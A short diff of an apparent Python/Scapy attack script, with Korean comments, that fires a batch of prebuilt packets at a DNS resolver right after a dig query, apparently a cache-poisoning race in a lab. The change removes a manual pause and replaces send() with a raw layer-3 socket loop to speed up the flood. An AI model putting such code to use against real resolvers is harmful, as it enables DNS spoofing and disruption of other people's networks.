@@ -47,14 +47,17 @@ def start_attack():
     print("  3. 리졸버에게 쿼리 전송 (dig @localhost ...)")
     print("="*50)
     
-    input("\n[▶] dig 명령어를 날린 직후, 여기서 [Enter] 를 눌러 전송")
+    #input("\n[▶] dig 명령어를 날린 직후, 여기서 [Enter] 를 눌러 전송")
 
     # 3. 전송 실행
     print("[🔥] 포격 개시!")
     start_send = time.time()
     
     # inter=0 으로 설정하여 지연 없이 통으로 전송
-    send(pkts, inter=0, verbose=0)
+    s = conf.L3socket()
+    for p in pkts:
+        s.send(p)
+    s.close()
     
     end_send = time.time()
     elapsed = end_send - start_send
